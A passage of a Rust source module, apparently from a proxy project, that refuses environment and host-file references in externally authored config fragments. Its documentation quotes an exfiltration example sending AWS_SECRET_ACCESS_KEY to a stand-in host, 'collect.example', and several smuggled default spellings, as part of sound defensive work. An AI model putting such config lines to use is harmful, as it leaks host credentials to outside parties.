// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Confined template resolution for externally authored config fragments.
//!
//! # The problem this closes
//!
//! Two passes on the compile path read the process environment with no
//! restriction at all:
//!
//! * [`crate::compiler::interpolate_env_vars`] substitutes `${VAR}` over
//!   the raw document *text*, before any parse, inside
//!   [`crate::compile_config`]. Being text-level, it reaches every byte
//!   of the document, including the `lua_script` / `js_script` /
//!   `rego_module` bodies that the post-parse interpolator deliberately
//!   skips.
//! * `{{env.X}}` resolution inside
//!   [`crate::compiler::interpolate_config_vars`] does the same per JSON
//!   string value after the parse.
//!
//! While every byte of the document is written by the operator who runs
//! the proxy, that is defensible: the operator already has the
//! environment. That assumption is already false, and was before config
//! aggregation was designed. A `source:` block's `kind: git` compiles a
//! document authored by whoever can push to that repository, and a
//! config-authority subscriber compiles a document authored by the
//! authority. Both go through the same unrestricted passes. Config
//! aggregation adds a third case rather than creating the first one.
//!
//! In each of them an unrestricted reader turns a config write
//! permission into a read of every secret in the compiling host's
//! environment, which is exactly where credentials live. A document
//! shipping
//!
//! ```yaml
//! action:
//!   type: proxy
//!   url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
//! ```
//!
//! exfiltrates on the next compile.
//!
//! # The half template syntax cannot see
//!
//! Template forms are not the only way a document reads its host, and a
//! boundary that stopped only those would refuse one spelling of an
//! attack while waving through the other. Three more forms carry no
//! `${` and no `{{` at all:
//!
//! * `env:NAME` and the legacy `vault://env/NAME` alias are secret
//!   references the process resolver reads out of the environment at
//!   config load
//!   (`crates/sbproxy-vault/src/resolver.rs:135-165`). `api_key:
//!   "env:AWS_SECRET_ACCESS_KEY"` is the attack above with the quotes
//!   moved.
//! * `file:PATH` is the same thing against the filesystem.
//! * A named list of config keys carries a host path the proxy opens:
//!   `rego_module_path` and `module_path` are read by the compiler
//!   (`crates/sbproxy-config/src/compiler.rs:590`), and `spec_file`,
//!   `sha1_file`, `transcode.descriptor_set`, `bulk_list.path` and
//!   `feed.cache_dir` are opened by the module constructors the
//!   compiled pipeline runs. `HOST_FILE_KEYS` is that list.
//!
//! [`ConfinementPolicy`] withholds all three from a fragment, and the
//! last two from a whole document fetched from elsewhere. Provider-URI
//! references (`secret://`, `vault://<backend>/`, `awssm://`) are
//! deliberately still allowed: each resolves only against a backend the
//! operator declared under `proxy.secrets`, which is a path no
//! externally authored document may set. The one exception is
//! [`ConfinementPolicy::bundle_manifest`], where the value being checked
//! was authored by the bundle itself and lands in guest code that can
//! read it, so no reference of any kind resolves.
//!
//! # The shape, and why this one
//!
//! [`resolve_confined_fragment`] resolves a fragment against a binding
//! set the *caller* supplies and nothing else. It reads no environment
//! variable, on any code path, in any field. A fragment names an
//! **input**; the operator decides what that input is bound to.
//!
//! That is the model Helm settled on and it is the state of the art for
//! third-party-authored template fragments. Helm ships the whole Sprig
//! function library to chart authors except `env` and `expandenv`,
//! removed because they "would have given chart authors access to
//! Tiller's environment"; a chart resolves against caller-supplied
//! `.Values` instead (<https://helm.sh/docs/howto/charts_tips_and_tricks/>,
//! <https://github.com/helm/helm/pull/5815>). Argo CD excludes the same
//! two functions plus `getHostByName` from its Sprig exposure. It is the
//! same boundary Kubernetes draws one layer down: a container's
//! environment is what the Pod spec enumerates through `env` and
//! `envFrom`, and a container never sees the kubelet's environment.
//!
//! The alternatives were considered and are weaker:
//!
//! * **A name allowlist or prefix** (decK requires a `DECK_` prefix on
//!   any variable a state file may reach through `${{ env "..." }}`,
//!   <https://developer.konghq.com/deck/reference/env-variables/>). The
//!   fragment still names a process variable, so every variable that
//!   happens to carry the prefix is readable, and the allowlist is a
//!   property of the runner rather than of the caller. A binding set is
//!   strictly stronger: the fragment cannot name a variable at all, and
//!   the operator is free to bind the input from the environment, from a
//!   secret backend, or from a literal, without the fragment knowing or
//!   caring.
//! * **A prefix with no allowlist** (Caddy's `{env.NAME}`). Explicit
//!   about which placeholder is an environment read, silent about which
//!   variables are in scope: all of them are.
//! * **Document-wide text substitution** (APISIX's `${{VAR:=default}}`
//!   over `config.yaml`). This is what sbproxy does today for
//!   operator-authored config, and it is precisely the primitive that
//!   cannot express "this subtree is env-frozen".
//! * **Scanning fragment text for `${` before splicing.** A deny list
//!   over text: it forbids legitimate forms (`${args.id}` is MCP
//!   local-tool vocabulary, `$${VAR}` is the documented escape) while
//!   missing anything a later resolution step can synthesize. The
//!   project rule is that a boundary is an allowlist, never a deny list.
//!
//! Envoy is the outlier worth naming: it has no document-wide
//! environment substitution at all, and the environment enters only at
//! named extension points such as the `%ENVIRONMENT(X)%` access-log
//! command operator. That is the same instinct, expressed by having no
//! general mechanism to confine.
//!
//! # The contract
//!
//! Given a fragment and a binding set, [`resolve_confined_fragment`]
//! returns YAML in which **nothing a later pass could resolve
//! survives**. Concretely:
//!
//! | Form | Confined treatment | Why |
//! |---|---|---|
//! | `{{vars.X}}`, `{{variables.X}}` | resolved from the bindings; an unbound `X` is [`ConfinedTemplateError::UnboundInput`] | the one thing a fragment may parameterize |
//! | `${VAR}`, `${VAR:-default}` | refused, naming `VAR` and the field | `interpolate_env_vars` would read it, in any field |
//! | `{{env.X}}` outside a script body | refused, naming `X` and the field | `interpolate_config_vars` would read it |
//! | `{{env.X}}` inside a script body | literal | no pass resolves `{{ }}` in a script body |
//! | `${args.x}`, `${steps.x.y}`, `${method}` | literal | runtime vocabulary; `interpolate_env_vars` does not touch it either |
//! | `$${VAR}` | literal | the documented escape; no pass resolves it |
//! | `{{request.x}}`, any other `{{prefix}}` | literal | resolved nowhere, at compile or at runtime |
//! | any script body (`lua_script`, `js_script`, `rego_module`) | no `{{ }}` substitution at all | WOR-2482: a literal `{{` in a script must reach the engine as authored |
//!
//! The refusal set is defined as *exactly* the placeholders some
//! fleet-wide pass would resolve from the environment, and it is
//! computed with the same scanner that pass uses (`env_references_in`
//! and `placeholder_is_env_reference`, both in
//! [`crate::compiler`]). Sharing the
//! scanner is deliberate: a detector narrower than its enforcer is worse
//! than none, and the `$$` pair-parity rule and the MCP `args.` /
//! `steps.` carve-out are exactly the places two hand-written copies
//! would drift.
//!
//! # Why refuse rather than pass through
//!
//! WOR-2433 leaves the choice open between refusing a `${VAR}` that
//! survives a fragment and escaping it so the publish-time
//! unresolved-reference check does not see it. This module refuses, for
//! two reasons.
//!
//! Passing one through is not safe. The confined pass runs on the
//! fragment; the *composed* document then goes to
//! [`crate::compile_config`], whose text-level `${VAR}` substitution
//! reaches every byte, script bodies included. A `${VAR}` that survives
//! confinement is read from the aggregator's environment a moment later,
//! which is the whole defect.
//!
//! Escaping is not honest. `$${VAR}` survives both passes, but the `$$`
//! bytes stay in the value: only the MCP local-tool engine owns an
//! unescape, so a Lua body would reach its engine as `$${VAR}` rather
//! than as authored. Rewriting a script body is worse than refusing to
//! ship it.
//!
//! Refusing keeps the publish-time check honest in both directions.
//! [`crate::unresolved_env_references`] still fires for
//! operator-authored content, because that path is untouched; and it
//! cannot misfire on a confined fragment, because a confined fragment
//! carries no live `${VAR}` for it to find.
//!
//! # What this module does not do
//!
//! It does not change the fleet-wide passes. Operator-authored config
//! keeps today's behavior exactly, `${VAR:-default}` shell semantics
//! included. Confinement applies where a caller asks for it, and the
//! callers are the places config text arrives from a party that does not
//! own the compiling host: `validate_publish_payload` on the config
//! authority, the subscriber's merge of a remote bundle, an extension
//! bundle manifest's own config values
//! (`sbproxy_extension::bundle::envelope::prepare_hook_config`), and the
//! git arm of [`crate::source`]'s loader when the operator asked for it
//! with `source.confine: true`.
//!
//! # What this boundary does not stop, stated rather than implied
//!
//! **A remote document may still name a process variable.**
//! [`ConfinementPolicy::remote_document`] allows `${VAR}`, so a
//! git-sourced document or an authority bundle can name a process
//! variable that resolves on the node. The existing
//! [`crate::unresolved_env_references`] gate only refuses a reference
//! that *fails* to resolve, so one that succeeds is invisible to it.
//! Closing that needs the node's own operator to declare which variable
//! names a remote document may name, which is a config key this module
//! does not add and cannot invent: defaulting it to "none" would break
//! every git-sourced fleet on upgrade, and defaulting it to "any" is the
//! behavior described here. A fragment has no such gap, because
//! [`ConfinementPolicy::sealed`] allows no environment name at all.
//!
//! That residual reaches further than the document. `${VAR}` is
//! substituted over the whole text before the parse
//! (`crate::compiler::interpolate_env_vars`), so a `remote_document`
//! confined config can write `token: "${AWS_SECRET_ACCESS_KEY}"` in an
//! extension bundle's attachment config and the resolved value is handed
//! to guest code, which can put it in a response. That is the same
//! outcome [`ConfinementPolicy::bundle_manifest`] exists to prevent,
//! reached from the operator-config side rather than from the manifest,
//! and it is the strongest single argument for the operator-declared
//! name allowlist this leaves open. Nothing in the tree adds that
//! allowlist today, and this module cannot invent it.
//!
//! **A `${VAR:-default}` default is document text, and is treated as
//! such.** The pre-parse pass gives the default the value's place
//! whenever the variable is unset or empty, so the document, not the
//! node, chose those bytes. Two consequences, both of them new in
//! WOR-2433 re-review round 3, because before them `${VAR:-...}` was a
//! general escape from this whole boundary:
//!
//! * Under a policy that grants the process environment the walk runs a
//!   second time over the document with its own defaults filled in
//!   (`fill_document_written_defaults`), so an assembled mapping key
//!   (`"${SB_NOPE:-path}"` under `action:`) meets `HOST_FILE_KEYS` and
//!   an assembled value (`"${SB_NOPE:-env:AWS_SECRET_ACCESS_KEY}"`)
//!   meets the host-backed secret refusal. A bare `${VAR}` is left
//!   alone in that view, because those bytes are the node's.
//! * A default that is itself a host-backed secret reference, or an
//!   absolute or `~`-relative path, is refused outright wherever it
//!   appears ([`ConfinedTemplateError::HostReachingDefault`]). That
//!   over-refuses a URL path written as `${SB_PREFIX:-/v1}`, which is
//!   deliberate: `HOST_FILE_KEYS` is a list of keys rather than a rule
//!   about paths, an assembled path can land on a key nobody added to
//!   it, and the two legal spellings (write the literal, or write
//!   `${VAR}` with no default) cost the author nothing.
//!
//! **A git-sourced document is not confined unless the operator says
//! so.** `source.confine` defaults to `false`, so a `source: { kind:
//! git }` document keeps every power it has today. Two reasons, and the
//! first is the one that decides it:
//!
//! * Flipping it on is a **fail-closed upgrade on a running fleet**. A
//!   node that boots into a refusal serves nothing, and every GitOps
//!   deployment that names a host path in its repository would refuse
//!   its own config on the release that changed the default. That is the
//!   worst upgrade shape there is, and it is what makes this a decision
//!   the operator takes rather than one a release takes for them.
//! * The `HOST_FILE_KEYS` half has **no substitute spelling**. A path
//!   still has to be a host path, so a repository that names one has
//!   nowhere else to put it except a layer the node owns, which on a
//!   git-sourced node means a `git_overlay` over a local base.
//!
//! What is *not* a reason, though an earlier draft of this module said
//! it was: that a clustered node would have no legal spelling for its
//! secret. `remote_document` keeps `${VAR}`, the pre-parse pass
//! substitutes it, and `crate::cluster`'s shared-key validation runs on
//! the substituted value, so `shared_key: "${SB_CLUSTER_SHARED_KEY}"` is
//! legal under `confine: true` and fails closed when the variable is
//! unset. `env:NAME` and `file:PATH` are documented and widely used
//! (docs/secrets.md), which is a migration cost, not an impossibility.
//! Pinned by `a_confined_document_may_name_its_shared_key_as_a_variable`.
//!
//! Silence is not the default, though. An unconfined git source whose
//! document reaches for this host logs one warning naming the **first**
//! finding the walk reaches, at boot and again whenever a refresh brings
//! a revision this process has not checked (`crate::source`'s
//! `warn_unconfined_host_reference`), naming the source and the key and
//! never the value, so an operator on the default learns that the
//! setting exists and what turning it on would refuse. First rather than
//! every: the walk returns on the first refusal, so a document naming
//! both a host path and an `env:` reference reports one of them and
//! reports the other once the first is fixed.
//! An operator whose config repository is written by somebody else sets
//! `source.confine: true` and gets
//! [`ConfinementPolicy::remote_document`].
//!
//! **The host-file list is a list.** `HOST_FILE_KEYS` names the config
//! keys it knows about and refuses those. It is not a rule about host
//! files in general and cannot be: the enforcers are module
//! constructors, the extension loader and the boot path, each of which
//! opens whatever path its own config key names, and a module added
//! later opens a path this list has never heard of. Two shapes it
//! cannot express today, both recorded on `HostFileKey`: a key that is a
//! host path only when a *sibling* key says so (`action.path` is refused
//! whatever `backend:` says), and a key whose parent scope is a
//! coincidence rather than a contract.
//!
//! The list carries the `path:LINE` of the function that opens each key,
//! and where two keys reach one read it names the function that chooses
//! between them, which is what `feed.cache_file` taught: listing
//! `feed.cache_dir` alone left the guard bypassable by its own sibling
//! through `cache_path()`. `a_document_naming_a_host_file_key_is_refused`
//! pins every entry by literal name and shape, so deleting one goes red,
//! and asserts the count so adding one without a pin goes red too.
//!
//! Noticing a key nobody added is the job of
//! `every_path_shaped_schema_key_is_covered_or_explained`, which walks
//! **every schema this repository generates** - the six files under
//! `schemas/`, all of them gated by `scripts/check-config-schema.sh` -
//! for every path-shaped property and requires each one to be on
//! `HOST_FILE_KEYS` or on a written allowlist. A prose instruction to
//! "run the sweep again" was the previous answer and it was not one:
//! re-running it turned up about twenty-five uncovered keys, four of
//! them the audit chain's own sinks (WOR-2433 re-review round 3).
//! Sweeping only `sb-config.schema.json` was the answer after that, and
//! it was not one either: the AI blocks are untyped *there* and fully
//! typed in `schemas/ai-proxy-provider.schema.json`, which is where
//! `origins.*.ai.providers[].serve` lives, and that block names an
//! engine binary this node executes (WOR-2433 re-review round 4).
//!
//! **Naming an environment variable is not always reading a secret out
//! of it.** `WafFeedConfig::signature_key_env` and `auth_token_env`
//! (`crates/sbproxy-modules/src/policy/waf/feed.rs:164,170`) take the
//! *name* of an environment variable from config and read it at
//! runtime. They are deliberately not refused: the value never reaches
//! the document or a response (it is an HMAC key and a bearer token the
//! subscriber sends to the feed it was configured with), and naming the
//! variable is the only way the feature can be configured at all, so
//! refusing it would leave the feature with no legal spelling. The same
//! reasoning covers `api_key_env` on the MCP action and on the semantic
//! constraint policy, and `token_env` in
//! [`crate::types`], all of which are consistently left off the list.
//!
//! The mirror of `sbproxy-vault`'s host-backed reference set is a mirror
//! and not a call, because `sbproxy-config` does not depend on that
//! crate. See `crate::types::host_backed_secret_reference` for what
//! holds the two in step and what it cannot see.

use std::collections::HashMap;

use crate::compiler::{env_references_in, lookup_variable_path};
use crate::types::{host_backed_secret_reference, HostSecretSource};

/// Keys whose value is an executed or evaluated script body rather than
/// config text.
///
/// The same list [`crate::compiler::interpolate_config_vars`] skips, and
/// for the same reason (WOR-2482): a literal `{{` inside a Lua string, a
/// JS comment, or a Rego module must reach its engine as authored, so no
/// `{{ }}` substitution runs inside one. `${VAR}` is a different matter
/// and is refused here even inside a script body, because the text-level
/// pre-parse pass on the composed document does reach it.
const SCRIPT_BODY_KEYS: &[&str] = &["lua_script", "js_script", "rego_module"];

/// The `{{ }}` prefixes some later pass resolves, and which therefore
/// must not survive a confined fragment.
///
/// `request.` is absent on purpose: it is bound per request by the
/// modifier context, never from the environment, and the fleet-wide pass
/// leaves it literal too.
const RESOLVABLE_BRACE_PREFIXES: &[&str] = &["env.", "vars.", "variables."];

/// Where in a document a [`HostFileKey`] entry matches.
///
/// A key name is the only thing an entry has to go on, and some names
/// carry their meaning anywhere (`tls_cert_file`) while others are a
/// whole vocabulary's worth of ordinary config text one parent over
/// (`path`). This is that discriminator, and it is deliberately shallow:
/// a scope is one or two mapping keys, never a full path, because the
/// document that has to match it is walked without a schema.
#[derive(Debug, Clone, Copy)]
enum KeyScope {
    /// The key name means a host path wherever it appears. Reserved for
    /// names no other config surface reuses (`rego_module_path`,
    /// `cert_file`, `state_path`).
    Anywhere,
    /// Directly under this mapping key. `path` is why this exists:
    /// refusing every `path` in a document would refuse a `source:`
    /// block's own repository path, `health_check.path`, and half the
    /// routing vocabulary with it.
    ///
    /// A parent is a shallow discriminator, which is a real limit worth
    /// stating: `action.path` is a host path when the storage action's
    /// sibling `backend:` is `local` and meaningless otherwise, and this
    /// entry refuses it either way. That is the safe direction today
    /// because no other action puts a `path` directly under `action:`;
    /// an action that needs one would have to teach this enum about
    /// sibling keys.
    Under(&'static str),
    /// Under a mapping key the *operator* names, itself directly under
    /// this one. `proxy.model_host.engines.<name>.path` is why: the
    /// engine name is the operator's word, so no fixed parent can scope
    /// the key it owns, and the grandparent is the only fixed thing in
    /// the trail.
    UnderAnyChildOf(&'static str),
}

/// The two mapping keys above the one being checked.
///
/// Two rather than the whole trail because that is what
/// [`KeyScope`] can express, and carrying a trail nothing reads would
/// invite an entry that quietly depends on depth. A sequence does not
/// consume a level: the owning key of `bulk_list: [ { path: ... } ]` is
/// still `bulk_list` for the mapping inside it.
#[derive(Debug, Clone, Copy, Default)]
struct Ancestry<'a> {
    /// The mapping key two levels up, or `None` at or near the root.
    grandparent: Option<&'a str>,
    /// The mapping key directly above, or `None` at the root.
    parent: Option<&'a str>,
}

impl<'a> Ancestry<'a> {
    /// The ancestry one mapping level deeper, entered through `key`.
    fn under(self, key: &'a str) -> Self {
        Self {
            grandparent: self.parent,
            parent: Some(key),
        }
    }
}

impl KeyScope {
    /// Whether a key sitting at `ancestry` is in this scope.
    fn covers(self, ancestry: Ancestry<'_>) -> bool {
        match self {
            Self::Anywhere => true,
            Self::Under(parent) => ancestry.parent == Some(parent),
            Self::UnderAnyChildOf(grandparent) => {
                ancestry.parent.is_some() && ancestry.grandparent == Some(grandparent)
            }
        }
    }
}

/// One config key whose value the proxy opens on the host filesystem:
/// the key as authored, the scope that disambiguates the match, the
/// remedy the refusal offers, and an optional test on the value.
#[derive(Debug)]
struct HostFileKey {
    /// Where this key has to sit to be this entry.
    scope: KeyScope,
    /// The key as authored.
    key: &'static str,
    /// What the operator does instead, rendered into the refusal. Named
    /// after something that exists, because a remedy naming a key the
    /// module does not have is worse than no remedy at all. The message
    /// adds the layer-level remedy that every one of these shares.
    remedy: &'static str,
    /// When set, the key names a host path only for values this answers
    /// `true` for. `agent_skills[].url` is why: it is a fetched URL for
    /// an `https://` value and a host file read for anything else
    /// (`crates/sbproxy-modules/src/projections/agent_skills.rs:341-347`),
    /// so a name-only entry would either miss the read or refuse the
    /// documented remote form.
    host_path_value: Option<HostPathTest>,
}

/// A test on one value, plus the sibling `type:` of the mapping it sits
/// in when that mapping has one.
///
/// The sibling is the serde tag and nothing else. Half this config
/// vocabulary is `#[serde(tag = "type")]`, so one key can be a host path
/// under one variant and a remote reference under another:
/// `extensions.sources[].path` is a host directory under
/// `type: directory` and a directory *inside the fetched repository*
/// under `type: git` (`crates/sbproxy-config/src/extensions.rs:167-183`),
/// and an entry that could not tell them apart refused the one spelling
/// its own remedy pointed at (WOR-2433 re-review round 4).
///
/// Deliberately the tag alone rather than the whole mapping. A test that
/// can read any sibling is a test that can quietly depend on one, and
/// the mapping is being walked mutably at the call site; the tag is read
/// once before that walk begins. A discriminator with another name
/// (`proxy.acme.storage_backend`) is out of reach, and the entries that
/// would want it say so and refuse every spelling instead.
type HostPathTest = fn(value: &str, sibling_type: Option<&str>) -> bool;

impl HostFileKey {
    /// Whether `key`, sitting at `ancestry` and carrying `value`, is
    /// this entry.
    ///
    /// A value that is not a string where a path belongs is refused
    /// rather than waved through: the module that reads it would reject
    /// it anyway, and fail-closed is the direction this boundary picks
    /// everywhere else.
    fn refuses(
        &self,
        ancestry: Ancestry<'_>,
        key: &str,
        value: &serde_yaml::Value,
        sibling_type: Option<&str>,
    ) -> bool {
        if self.key != key || !self.scope.covers(ancestry) {
            return false;
        }
        let Some(text) = value.as_str() else {
            // A value that is not a string where a path belongs is a
            // config error the module would reject anyway; refusing is
            // the fail-closed side.
            return true;
        };
        if !document_chose_the_path(text) {
            return false;
        }
        match self.host_path_value {
            None => true,
            Some(is_host_path) => is_host_path(text, sibling_type),
        }
    }
}

/// Whether the *document* chose this path, as opposed to naming a value
/// the node supplies.
///
/// A whole-value `${VAR}` with no `:-default` is the node's choice:
/// [`ConfinementPolicy::remote_document`] keeps `${VAR}` on purpose, the
/// pre-parse pass resolves it from the environment of the machine that
/// compiles, and an unset variable fails closed through
/// [`crate::unresolved_env_references`]. Refusing that spelling would be
/// the no-legal-spelling trap for real: `proxy.cluster.state_dir` is
/// required for a clustered node, and it is a path, so a document that
/// could not name it even through the node's own environment could not
/// configure a cluster at all.
///
/// Everything else is the document's choice and is refused: a literal, a
/// `${VAR:-/etc/cron.d}` whose default the document wrote, and any value
/// with text around the placeholder, because the bytes around it come
/// from the document.
///
/// Under [`ConfinementPolicy::sealed`] the question does not arise: a
/// fragment's `${VAR}` is refused by the environment scan a moment
/// later, with a message about the variable rather than about the key.
fn document_chose_the_path(value: &str) -> bool {
    let trimmed = value.trim();
    let Some(inner) = trimmed
        .strip_prefix("${")
        .and_then(|rest| rest.strip_suffix('}'))
    else {
        return true;
    };
    // A second `${` inside means this is not one whole-value
    // placeholder, and `:-` means the document wrote the fallback.
    inner.is_empty() || inner.contains("${") || inner.contains(":-")
}

/// Whether an `agent_skills[]` entry's `url` is read off this host.
///
/// `resolve_artifact_bytes`
/// (`crates/sbproxy-modules/src/projections/agent_skills.rs:341-347`)
/// fetches an absolute `http(s)` URL and, for anything else, strips the
/// leading slashes and reads `workspace_root.join(rest)` off the disk,
/// serving the bytes to clients. So the remote form stays legal and
/// every other form is a host read.
///
/// This predicate must mirror `resolve_artifact_bytes` **exactly**,
/// byte for byte, not approximately. It used to `trim()` first, and the
/// enforcer does not: `url: " https://example.test/x"` was waved through
/// as remote here and taken as a host read there, which is the
/// detector-narrower-than-the-enforcer shape at the one key this module
/// made value-aware (WOR-2433 re-review round 3). A future entry that
/// normalizes a value before testing it has the same bug waiting.
fn agent_skill_url_is_a_host_path(value: &str, _sibling_type: Option<&str>) -> bool {
    !(value.starts_with("https://") || value.starts_with("http://"))
}

/// Whether an `extensions.sources[]` entry's `path` is read off this
/// host.
///
/// `BundleSourceConfig` is `#[serde(tag = "type")]` with two variants
/// that both carry a `path`
/// (`crates/sbproxy-config/src/extensions.rs:167-183`).
/// `type: directory` names a directory on this filesystem, which is
/// extension *code* and is refused. `type: git` names a bundle
/// directory **inside the fetched repository**, which is the document's
/// own tree rather than this host, and it is the spelling both
/// extension-code remedies on this list point at, so refusing it left a
/// refusal whose only remedy the same entry refused
/// (WOR-2433 re-review round 4).
///
/// A `type: git` path still has to stay inside the checkout. The
/// extension loader validates the path is non-empty and nothing more
/// (`extensions.rs:126-131`), so an absolute or `..`-bearing value
/// under a git source reaches back out onto this host, and that is
/// refused here with everything else. A missing or unknown `type:` is
/// refused too: `deny_unknown_fields` will reject it later, and
/// fail-closed is the direction this boundary picks everywhere.
fn bundle_source_path_is_a_host_path(value: &str, sibling_type: Option<&str>) -> bool {
    if sibling_type != Some("git") {
        return true;
    }
    !path_stays_inside_a_checkout(value)
}

/// Whether a path names something inside a fetched repository and
/// cannot leave it: non-empty, relative, no `..`, no `~`, and no colon
/// (a scheme or a Windows drive).
///
/// `Path::components` is what decides, rather than a substring scan, so
/// `a/../../etc` is a `ParentDir` component rather than a `..` needle
/// somebody can spell around.
fn path_stays_inside_a_checkout(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('~')
        && !value.contains(':')
        && std::path::Path::new(value).components().all(|component| {
            matches!(
                component,
                std::path::Component::Normal(_) | std::path::Component::CurDir
            )
        })
}

/// Whether a served model's LoRA adapter `source` is read off this
/// host.
///
/// `LoraAdapter::source` is "an `hf:Org/Repo` reference or a local path"
/// (`crates/sbproxy-model-host/src/config.rs:562`), so the remote form
/// stays legal and everything else is a directory this node loads
/// adapter weights out of.
fn lora_adapter_source_is_a_host_path(value: &str, _sibling_type: Option<&str>) -> bool {
    !value.starts_with("hf:")
}

/// Whether a compression lever's `endpoint` is a host socket.
///
/// The value is "a classifier gRPC URI or absolute `unix://` socket
/// path" (`crates/sbproxy-ai/src/compression/config.rs:233`), and the
/// `unix://` form is stripped to a filesystem path and connected to
/// (`:669`). The network form is an egress destination, which is a
/// different boundary and not this list's business.
fn compression_lever_endpoint_is_a_host_path(value: &str, _sibling_type: Option<&str>) -> bool {
    value.starts_with("unix://")
}

/// Config keys whose value is a path the proxy opens on the host
/// filesystem or writes to it.
///
/// Two of them are read by the compiler itself: `rego_module_path` in
/// `resolve_rego_modifier_module`
/// (`crates/sbproxy-config/src/compiler.rs:590`) at compile and again on
/// every reload, and `module_path`, its spelling on `policy: rego` and
/// on `transforms[] type: wasm`. The rest are opened by module
/// constructors that `CompiledPipeline::from_config` runs, by the
/// extension loader, or at boot, which is why "the compiler has exactly
/// one host-file read" was true and beside the point (WOR-2433
/// re-review).
///
/// # How this list is kept honest
///
/// The method is a sweep of **every schema this repository generates**,
/// not of the Rust field declarations, and
/// `every_path_shaped_schema_key_is_covered_or_explained` runs that
/// sweep as a test rather than leaving it to whoever remembers. The
/// schemas are generated from the same types, are the operator-facing
/// surface, and give a dotted path per key, so a parent scope is read
/// off rather than guessed.
///
/// All six files under `schemas/` are swept, because
/// `sb-config.schema.json` alone is not the config surface. It leaves
/// the module and AI blocks untyped (`origins.*.policies[]`,
/// `origins.*.action`, `origins.*.ai`, `proxy.extensions.*`), and five
/// of those blocks have a generated schema of their own:
/// `ai-proxy-provider`, `ai-semantic-cache`, `ai-rag`,
/// `ai-compression`, `ai-external-guardrail`. All six are regenerated
/// and diffed by `scripts/check-config-schema.sh` on every PR, so a
/// type change that adds a path cannot land without moving one of them,
/// and the sweep runs over whatever moved. `ai-proxy-provider` is where
/// `origins.*.ai.providers[].serve` lives, which is
/// `sbproxy_model_host::ModelHostConfig`
/// (`crates/sbproxy-ai/src/provider.rs:161`): a fifth crate that
/// deserializes `sb.yml`, carrying a weight-cache directory, a catalog
/// file and an engine binary this node **executes**
/// (`engines.<kind>.acquire.path` becomes
/// `BinaryAcquirePlan::Explicit` at
/// `crates/sbproxy-model-host/src/acquire.rs:100-103`). Sweeping the
/// top-level schema alone missed all three, and the doc claimed the
/// untyped blocks had been swept out of `sbproxy-ai` and
/// `sbproxy-core` when `sbproxy-model-host` was never looked at
/// (WOR-2433 re-review round 4).
///
/// A property is path-shaped when its **name** carries a marker
/// (`path`, `file`, `dir`, `_dir`, `ca_file`, `key_file`, `cert`,
/// `socket`, `log`, `sink`) **or** its **description** does
/// (`file`, `path`, `director...`, `socket`). Two signals rather than
/// one because a name-only detector is exactly as wide as its marker
/// list: `proxy.acme.ca_root` is a PEM this process reads with
/// `std::fs::read` (`crates/sbproxy-tls/src/lib.rs:986-988`) and its
/// name carries no marker, and `proxy.admin.tls.key` had to be added to
/// this list by hand for the same reason. Each hit must be on this list
/// or on that test's `SCHEMA_KEYS_THAT_ARE_NOT_HOST_PATHS` allowlist
/// with a written reason. The description signal is noisy on purpose:
/// it is cheaper to write a line saying why `path.prefix` is not a
/// filesystem path than to discover the next `ca_root` in a re-review.
///
/// The earlier methods, in order: sweep `pub <name>(path|file|dir):` in
/// `sbproxy-config` and `sbproxy-modules` by hand (missed about
/// twenty-five keys including all four audit-chain sinks); sweep the
/// top-level schema by name (missed `ca_root` and the whole `serve:`
/// block). What is left uncovered now is stated rather than implied:
/// nothing in the six schemas, and, outside them, any config block that
/// is untyped in all six.
///
/// Where two config keys reach the same read, the entry names the
/// function that *chooses* between them rather than the read site,
/// which is what `feed.cache_file` taught: listing `feed.cache_dir`
/// alone left the guard bypassable by its own sibling through
/// `cache_path()`.
///
/// # The enforcers, by class
///
/// **Compiled by the pipeline.**
///
/// * `spec_file` - `crates/sbproxy-modules/src/policy/openapi_validation.rs:140`
/// * `sha1_file` - `crates/sbproxy-modules/src/policy/exposed_creds.rs:112`
/// * `transcode.descriptor_set` - `crates/sbproxy-modules/src/action/grpc.rs:135`
/// * `bulk_list.path` - `crates/sbproxy-modules/src/action/mod.rs:786`; the
///   file's contents become the redirect targets the proxy serves, so
///   they come back out over HTTP
/// * `feed.cache_dir` and `feed.cache_file` -
///   `WafFeedConfig::cache_path` (`crates/sbproxy-modules/src/policy/waf/feed.rs:227`),
///   which returns `cache_file` **in preference to** `cache_dir`. The
///   path is read (`feed.rs:838`), its parent is created (`:873`) and
///   the fetched bundle plus a `.sig` sibling are written to it
///   (`:887,:890`)
/// * `spec_path` - `crates/sbproxy-modules/src/action/mcp.rs:5903`
/// * `argument_policies[].path` and `result_policies[].path` -
///   `crates/sbproxy-modules/src/action/mcp.rs:2419,2749`
/// * `tool_versioning.lockfile` -
///   `crates/sbproxy-modules/src/action/mcp.rs:727`
/// * `agent_skills[].path` and `agent_skills[].url` -
///   `resolve_artifact_bytes`
///   (`crates/sbproxy-modules/src/projections/agent_skills.rs:323-347`),
///   which reads either one and serves the bytes to clients
/// * `action.path` - `resolve_local_root`
///   (`crates/sbproxy-modules/src/action/storage.rs:193`) roots an
///   object store at it and the storage action serves everything under
///   it over HTTP; `reject_traversal` (`:552`) rejects `..` but not an
///   absolute `/`
///
/// **Model and detector weights**, all of them files this process
/// mmaps or executes against: `model_path`, `tokenizer_path`,
/// `model_signature_path`, `tokenizer_signature_path`
/// (`crates/sbproxy-modules/src/policy/prompt_injection_v2/inprocess.rs:65,68,291,293`,
/// and the same two names under the semantic cache's `inprocess:`
/// (`crates/sbproxy-ai/src/semantic_cache/config.rs:188,191`, read at
/// `crates/sbproxy-core/src/server/ai_support.rs:2601-2615`) and under
/// the guardrail classifier's `backend:`
/// (`crates/sbproxy-ai/src/guardrails/classifier.rs:111,113`, read at
/// `crates/sbproxy-core/src/server/ai_classifier.rs:404-410`)), plus
/// `rule_pack_path` and `onnx_model_path`
/// (`crates/sbproxy-core/src/pipeline.rs:1481,1486`, loaded at
/// `crates/sbproxy-core/src/server/lifecycle.rs:1051`), plus the
/// `geoip` policy's `database_path`
/// (`crates/sbproxy-modules/src/enricher/geoip.rs`, declared on
/// `GeoIpPolicy` and read with `std::fs::read` in `build_reader`).
/// That last one is why this list is a list rather than a rule: it sits
/// inside a `policies:` block, which the generated schema types as
/// `{"items": true}`, so `every_path_shaped_schema_key_is_covered_or_explained`
/// cannot see it and cannot be the thing that notices it is missing.
/// It has to be added by hand, exactly as the four detector paths above
/// it were. Scoped
/// `Anywhere` on purpose: the names are the same class one parent key
